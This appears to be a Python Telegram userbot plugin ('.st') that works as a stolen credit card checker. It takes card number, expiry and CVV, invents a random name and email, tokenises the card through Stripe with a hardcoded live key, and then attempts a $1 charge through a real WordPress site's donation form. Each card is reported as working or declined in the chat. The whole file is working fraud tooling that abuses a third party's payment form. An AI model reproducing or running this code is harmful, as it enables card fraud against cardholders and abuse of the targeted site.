import httpx
import string
import random
import time

from datetime import datetime
from telethon import events
from ubb import Ubot


@Ubot.on(events.NewMessage(pattern=r'\.st'))
async def st_charge(event):
    cc = event.message.message[len('.st '):]
    reply_msg = await event.get_reply_message()
    if reply_msg:
        cc = reply_msg.message
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
    if not cc.startswith(VALID):
        return await event.edit('**Invalid CC Type**')
    start = time.time()
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]

    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for i in range(6))
    Last = ''.join(random.choice(letters) for i in range(6))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
    if not cc.startswith(VALID):
        return await event.edit('**Invalid CC Type**')

    async with httpx.AsyncClient() as client:
        headers = {
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
        }
        r = await client.post('https://m.stripe.com/6', headers=headers)
        Muid = r.json()['muid']
        Sid = r.json()['sid']
        Guid = r.json()['guid']

        payload = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
            }
        head = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "application/json",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
            }

        re = await client.post('https://api.stripe.com/v1/tokens',
                               data=payload, headers=head)
        Id = re.json()['id']
        Country = re.json()['card']['country']
        Brand = re.json()['card']['brand']

        load = {
          "action": "wp_full_stripe_payment_charge",
          "formName": "Donate",
          "fullstripe_name": Name,
          "fullstripe_email": Email,
          "fullstripe_custom_amount": 1,
          "stripeToken": Id
        }
        header = {
          "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          "accept": "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9"
        }
        cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
        req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php',
                                data=load, headers=header, cookies=cookie)
        msg = req.json()["msg"]
        end = time.time()

        if 'security code is' in req.text:
            await event.edit(f'✅>**STRIPE 1$**\n'+
                             f'**CC** `{cc}`\n'+
                             f'**Msg**==> `{msg}`\n'+
                             f'**Brand**==> {Brand}\n'+
                             f'**Country**==> {Country}\n'+
                             f'**Time-Stamp** ==> {datetime.now()}\n'+
                             f'**Time-Took** ==> {end-start}\n'+
                             f'**Userbot-By** ~ @Xbinner')

        elif "true" in req.text:
            await event.edit(f'✅>**STRIPE 1$**\n'+
                             f'**CC**==> `{cc}`\n'+
                             f'**Msg**==> `{msg}`\n'+
                             f'**Brand**==> {Brand}\n'+
                             f'**Country**==> {Country}\n'+
                             f'**Time-Stamp** ==> {datetime.now()}\n'+
                             f'**Time-Took** ==> {end-start}\n'+
                             f'**Userbot-By** ~ @Xbinner')
        else:
            await event.edit(f'❌>**STRIPE 1$**\n'+
                             f'**CC** `{cc}`\n'+
                             f'**Msg**==> `{msg}`\n'+
                             f'**Brand**==> {Brand}\n'+
                             f'**Country**==> {Country}\n'+
                             f'**Time-Stamp** ==> {datetime.now()}\n'+
                             f'**Time-Took** ==> {end-start}\n'+
                             f'**Userbot-By** ~ @Xbinner')
